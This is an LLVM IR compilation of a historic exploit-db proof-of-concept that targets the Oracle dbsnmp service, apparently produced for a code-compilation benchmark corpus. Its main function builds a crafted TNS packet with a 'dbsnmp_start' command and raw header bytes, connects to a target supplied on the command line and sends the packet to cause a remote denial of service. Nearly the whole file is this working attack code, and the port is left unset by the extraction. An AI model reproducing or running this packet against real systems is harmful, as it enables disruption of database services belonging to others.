; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_21232.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_21232.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.cmd1 = private unnamed_addr constant [80 x i8] c"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=)(HOST=)(USER=))(COMMAND=dbsnmp_start)\00", align 16
@__const.main.cmd2 = private unnamed_addr constant [14 x i8] c"(VERSION=1)))\00", align 1
@__const.main.head = private unnamed_addr constant [59 x i8] c"\00Y\00\00\01\00\00\00\016\01,\00\00\08\00\7F\FF\7F\08\00\00\00\01\00\1F\00:\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\004\E6\00\00\00\01\00\00\00\00\00\00\00\00\00", align 16
@.str = private unnamed_addr constant [68 x i8] c"Oracle dbsnmp command Remote Vulnerability discoveried by Benjurry\0A\00", align 1
@.str.1 = private unnamed_addr constant [35 x i8] c"Code by benjurry,benjurry@263.net\0A\00", align 1
@.str.2 = private unnamed_addr constant [34 x i8] c"www.xfocus.org  www.benjurry.org\0A\00", align 1
@.str.3 = private unnamed_addr constant [18 x i8] c"useage:%s target\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"WSAStartup failed.\0A\00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"Unable to resolve host %s\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [25 x i8] c"Unable to set up socket\0A\00", align 1
@.str.7 = private unnamed_addr constant [19 x i8] c"Unable to connect\0A\00", align 1
@.str.8 = private unnamed_addr constant [12 x i8] c"Connected.\0A\00", align 1
@.str.9 = private unnamed_addr constant [16 x i8] c"Unable to send\0A\00", align 1
@.str.10 = private unnamed_addr constant [16 x i8] c"code sented...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [80 x i8], align 16
  %7 = alloca [14 x i8], align 1
  %8 = alloca [59 x i8], align 16
  %9 = alloca [200 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.hostent*, align 8
  %16 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = bitcast [80 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([80 x i8], [80 x i8]* @__const.main.cmd1, i32 0, i32 0), i64 80, i1 false)
  %18 = bitcast [14 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %18, i8* align 1 getelementptr inbounds ([14 x i8], [14 x i8]* @__const.main.cmd2, i32 0, i32 0), i64 14, i1 false)
  %19 = bitcast [59 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %19, i8* align 16 getelementptr inbounds ([59 x i8], [59 x i8]* @__const.main.head, i32 0, i32 0), i64 59, i1 false)
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0))
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.2, i64 0, i64 0))
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %25, label %31

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.3, i64 0, i64 0), i8* %28)
  %30 = call i32 @exit(i32 1) #4
  unreachable

31:                                               ; preds = %2
  store i32 59, i32* %13, align 4
  store i32 150, i32* %11, align 4
  store i32 92, i32* %12, align 4
  %32 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 0
  %33 = getelementptr inbounds [59 x i8], [59 x i8]* %8, i64 0, i64 0
  %34 = call i32 @memcpy(i8* %32, i8* %33, i32 58)
  %35 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 0
  %36 = getelementptr inbounds i8, i8* %35, i64 59
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = getelementptr inbounds [80 x i8], [80 x i8]* %6, i64 0, i64 0
  %39 = call i32 @memcpy(i8* %37, i8* %38, i32 79)
  %40 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 0
  %41 = getelementptr inbounds i8, i8* %40, i64 59
  %42 = getelementptr inbounds i8, i8* %41, i64 -1
  %43 = getelementptr inbounds i8, i8* %42, i64 80
  %44 = getelementptr inbounds i8, i8* %43, i64 -1
  %45 = getelementptr inbounds [14 x i8], [14 x i8]* %7, i64 0, i64 0
  %46 = call i32 @memcpy(i8* %44, i8* %45, i32 14)
  %47 = load i32, i32* %11, align 4
  %48 = ashr i32 %47, 8
  %49 = trunc i32 %48 to i8
  %50 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 0
  store i8 %49, i8* %50, align 16
  %51 = load i32, i32* %11, align 4
  %52 = and i32 %51, 255
  %53 = trunc i32 %52 to i8
  %54 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 1
  store i8 %53, i8* %54, align 1
  %55 = load i32, i32* %12, align 4
  %56 = ashr i32 %55, 8
  %57 = trunc i32 %56 to i8
  %58 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 24
  store i8 %57, i8* %58, align 8
  %59 = load i32, i32* %12, align 4
  %60 = and i32 %59, 255
  %61 = trunc i32 %60 to i8
  %62 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 25
  store i8 %61, i8* %62, align 1
  %63 = call i32 @MAKEWORD(i32 1, i32 1)
  %64 = call i32 @WSAStartup(i32 %63, i32* %14)
  store i32 %64, i32* %13, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %71

66:                                               ; preds = %31
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  %68 = call i32 (...) @GetLastError()
  store i32 %68, i32* %13, align 4
  %69 = call i32 (...) @WSACleanup()
  %70 = call i32 @exit(i32 1) #4
  unreachable

71:                                               ; preds = %31
  %72 = load i8**, i8*** %5, align 8
  %73 = getelementptr inbounds i8*, i8** %72, i64 1
  %74 = load i8*, i8** %73, align 8
  %75 = call %struct.hostent* @gethostbyname(i8* %74)
  store %struct.hostent* %75, %struct.hostent** %15, align 8
  %76 = icmp eq %struct.hostent* %75, null
  br i1 %76, label %77, label %83

77:                                               ; preds = %71
  %78 = load i8**, i8*** %5, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %80)
  %82 = call i32 @exit(i32 1) #4
  unreachable

83:                                               ; preds = %71
  %84 = load i32, i32* @PORT, align 4
  %85 = call i32 @htons(i32 %84)
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  store i32 %85, i32* %86, align 4
  %87 = load i32, i32* @AF_INET, align 4
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i32 %87, i32* %88, align 4
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  %90 = load %struct.hostent*, %struct.hostent** %15, align 8
  %91 = getelementptr inbounds %struct.hostent, %struct.hostent* %90, i32 0, i32 0
  %92 = load i64, i64* %91, align 8
  %93 = inttoptr i64 %92 to %struct.in_addr*
  %94 = bitcast %struct.in_addr* %89 to i8*
  %95 = bitcast %struct.in_addr* %93 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %94, i8* align 4 %95, i64 4, i1 false)
  %96 = load i32, i32* @AF_INET, align 4
  %97 = load i32, i32* @SOCK_STREAM, align 4
  %98 = call i32 @socket(i32 %96, i32 %97, i32 0)
  store i32 %98, i32* %10, align 4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

100:                                              ; preds = %83
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.6, i64 0, i64 0))
  %102 = call i32 @exit(i32 1) #4
  unreachable

103:                                              ; preds = %83
  %104 = load i32, i32* %10, align 4
  %105 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %106 = call i32 @connect(i32 %104, %struct.sockaddr* %105, i32 12)
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %111

108:                                              ; preds = %103
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  %110 = call i32 @exit(i32 1) #4
  unreachable

111:                                              ; preds = %103
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0))
  br label %113

113:                                              ; preds = %111
  %114 = load i32, i32* %10, align 4
  %115 = getelementptr inbounds [200 x i8], [200 x i8]* %9, i64 0, i64 0
  %116 = load i32, i32* %11, align 4
  %117 = call i32 @send(i32 %114, i8* %115, i32 %116, i32 0)
  %118 = icmp eq i32 %117, -1
  br i1 %118, label %119, label %122

119:                                              ; preds = %113
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.9, i64 0, i64 0))
  %121 = call i32 @exit(i32 1) #4
  unreachable

122:                                              ; preds = %113
  %123 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.10, i64 0, i64 0))
  br label %124

124:                                              ; preds = %122
  %125 = call i32 @Sleep(i32 1000)
  %126 = load i32, i32* %10, align 4
  %127 = call i32 @closesocket(i32 %126)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @WSAStartup(i32, i32*) #2

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i32 @GetLastError(...) #2

declare dso_local i32 @WSACleanup(...) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @Sleep(i32) #2

declare dso_local i32 @closesocket(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
